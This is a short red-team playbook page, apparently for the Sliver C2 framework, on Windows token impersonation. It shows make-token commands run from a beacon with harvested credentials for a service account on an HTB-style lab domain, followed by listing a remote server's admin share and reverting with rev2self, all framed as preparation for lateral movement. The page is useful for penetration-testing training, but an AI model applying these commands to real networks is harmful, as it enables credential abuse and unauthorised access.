# 15.12 Impersonation make-token

> Clone the current token via `make-token` (LOGON_NEW_CREDENTIALS) for outbound auth without a logon; `rev2self` to revert.

## Overview

`make-token` creates a new Windows logon session with harvested credentials using LOGON_NEW_CREDENTIALS (default), which clones the current token for outbound connections without requiring the user to be logged in. `rev2self` reverts the token. Use before lateral movement to access remote shares.

## Steps

- `make-token -u <user> -d <domain> -p <password>` impersonates user for network resource access.
- Default logon type LOGON_NEW_CREDENTIALS allows SMB/LDAP access as the target user.
- Verify access by listing a remote share: `ls //srv01.child.htb.local/c$`.
- `rev2self` drops the impersonated token and returns to original context.
- `impersonate <username>` can impersonate a user already logged into the machine.
- `runas` spawns a new process in the context of specified credentials.

## Commands

### make-token for svc_sql

```text
sliver (http-beacon) > make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
```

### Verify access via share listing

```text
sliver (http-beacon) > ls //srv01.child.htb.local/c$
```

### Revert token

```text
sliver (http-beacon) > rev2self
```
